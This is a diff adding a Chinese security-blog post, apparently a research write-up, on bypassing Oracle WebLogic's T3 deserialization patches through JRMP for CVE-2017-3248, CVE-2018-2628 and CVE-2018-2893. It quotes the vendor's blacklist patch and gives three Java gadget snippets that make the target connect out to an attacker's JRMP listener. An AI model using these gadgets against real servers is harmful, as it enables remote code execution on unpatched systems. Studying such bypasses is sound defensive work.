@@ -175,6 +175,97 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/CVE20173248andCVE20182628andCVE20182893/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ky0127">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/04/CVE20173248andCVE20182628andCVE20182893/" class="post-title-link" itemprop="url">WebLogic基于T3协议的反序列化之利用JRMP进行绕过</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-04 01:58:54 / Modified: 02:00:39" itemprop="dateCreated datePublished" datetime="2022-02-04T01:58:54+08:00">2022-02-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+
+
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>前面的 CVE-2016-3510/CVE-2016-0638 都是把 payload 封装在对象里面进行绕过，而后续的绕过就利用 JRMP 进行绕过。</p>
+<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>直接使用 T3 协议打 payloads/JRMPClient Gadget，使目标连接我们架设好的 exploit/JRMPListern 后反序列化 JRMPListern 返回的恶意对象。</p>
+<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>在 <code>InboundMsgAbbrev$ServerChannelInputStream</code> 类上添加一个 <code>resolveProxyClass</code> 方法，不让反序列化 <code>Registry</code> 接口的代理类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   <span class="keyword">int</span> len$ = interfaces.length;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      String intf = arr$[i$];</span><br><span class="line">      <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>payloads/JRMPClient 不用代理类，直接使用 <code>RemoteObjectInvocationHandler</code> 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(host,port,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    LiveRef liveRef = <span class="keyword">new</span> LiveRef(<span class="keyword">new</span> ObjID(<span class="number">0</span>),tcpEndpoint,<span class="keyword">false</span>);</span><br><span class="line">    UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(liveRef);</span><br><span class="line">    RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">    <span class="keyword">return</span> remoteObjectInvocationHandler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>可以换为任意一个接口。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(host,port,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    LiveRef liveRef = <span class="keyword">new</span> LiveRef(<span class="keyword">new</span> ObjID(<span class="number">0</span>),tcpEndpoint,<span class="keyword">false</span>);</span><br><span class="line">    UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(liveRef);</span><br><span class="line">    RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">    Map proxy = (Map) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Map.class</span><br><span class="line">            &#125;, remoteObjectInvocationHandler);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>把 <code>RemoteObjectInvocationHandler/UnicastRef</code> 都加入了黑名单，把 <code>RemoteObjectInvocationHandler</code> 替换为另一个继承 <code>RemoteObject</code> 的类即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(host,port,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    LiveRef liveRef = <span class="keyword">new</span> LiveRef(<span class="keyword">new</span> ObjID(<span class="number">0</span>),tcpEndpoint,<span class="keyword">false</span>);</span><br><span class="line">    UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(liveRef);</span><br><span class="line">    RMIConnectionImpl_Stub rmiConnectionImpl_stub = <span class="keyword">new</span> RMIConnectionImpl_Stub(unicastRef);</span><br><span class="line">    <span class="keyword">return</span> rmiConnectionImpl_stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+    </div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/03/RegisteryAndDGC/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -767,7 +858,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
